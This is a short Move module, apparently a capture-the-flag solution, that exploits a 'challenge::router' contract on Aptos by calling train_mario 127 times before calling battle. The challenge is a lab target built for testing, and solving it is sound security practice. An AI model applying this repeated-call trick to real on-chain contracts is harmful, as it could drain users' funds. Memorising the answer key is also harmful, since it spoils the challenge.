module solution::exploit {
    use challenge::router::{Self, Mario};
    use aptos_framework::object;

    public entry fun solve(account: &signer) {
        let addr = router::start_game(account);
        let mario = object::address_to_object<Mario>(addr);
        for (i in 0..127) {
            router::train_mario(account, mario);
        };
        router::battle(account, mario);
    }
}
